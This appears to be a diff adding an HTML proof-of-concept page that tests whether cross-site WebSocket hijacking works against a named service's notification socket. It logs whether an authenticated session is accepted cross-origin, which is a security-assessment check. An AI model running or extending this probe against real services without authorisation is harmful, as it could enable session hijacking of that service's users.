@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head><title>WS CSWSH Test</title></head>
+<body>
+<h2>WebSocket CSWSH Test</h2>
+<div id="log" style="font-family:monospace; white-space:pre;"></div>
+<script>
+var log = document.getElementById('log');
+function addLog(msg) {
+  log.textContent += new Date().toISOString() + ' | ' + msg + '\n';
+}
+
+addLog('Starting cross-origin WebSocket test...');
+addLog('This page origin: ' + window.location.origin);
+addLog('Target: wss://sg.migoo.ai/beeai/api/v1/notification/ws');
+addLog('');
+
+try {
+  var ws = new WebSocket('wss://sg.migoo.ai/beeai/api/v1/notification/ws');
+  
+  ws.onopen = function() {
+    addLog('[OPEN] WebSocket connection established (101 upgrade)');
+    addLog('Waiting for server messages...');
+  };
+  
+  ws.onmessage = function(e) {
+    try {
+      var data = JSON.parse(e.data);
+      addLog('[MSG] type=' + data.type + ' code=' + (data.code||'N/A'));
+      if (data.code === 401) {
+        addLog('[RESULT] AUTH FAILED - Cookie not sent cross-origin (SameSite protection works)');
+        addLog('[CONCLUSION] CSWSH attack NOT feasible - SameSite cookie blocks cross-origin auth');
+      } else if (data.type === 'ping') {
+        addLog('[RESULT] GOT PING - Authenticated session! CSWSH WORKS!');
+        addLog('[CONCLUSION] CSWSH attack IS feasible - attacker can hijack WebSocket session');
+      }
+      addLog('Full message: ' + e.data.substring(0, 300));
+    } catch(ex) {
+      addLog('[MSG-RAW] ' + e.data.substring(0, 300));
+    }
+  };
+  
+  ws.onerror = function() {
+    addLog('[ERROR] WebSocket error');
+  };
+  
+  ws.onclose = function(e) {
+    addLog('[CLOSE] code=' + e.code + ' reason=' + e.reason);
+  };
+} catch(e) {
+  addLog('[EXCEPTION] ' + e.message);
+}
+</script>
+</body>
+</html>
